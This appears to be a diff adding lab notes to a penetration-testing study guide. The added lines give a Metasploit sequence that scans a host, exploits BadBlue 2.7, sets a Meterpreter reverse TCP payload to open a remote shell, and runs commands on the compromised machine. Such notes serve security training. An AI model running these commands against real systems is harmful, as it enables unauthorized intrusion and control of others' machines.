@@ -530,6 +530,24 @@ run
 
 ### 4. Assessment Methodologies: Vulnerability Assessment
 ```
+vulnerability assessment
+--------------------------
+nmap -sV 10.4.31.112
+google search badblue2.7
+
+
+msfconsole
+search badblue 2.7
+use 29
+info
+set payload windows/meterpreter/reverse_tcp
+set RHOSTS 10.10.32.2
+set lhost eth1
+show options
+run
+systeminfo
+
+
 ```
 
 
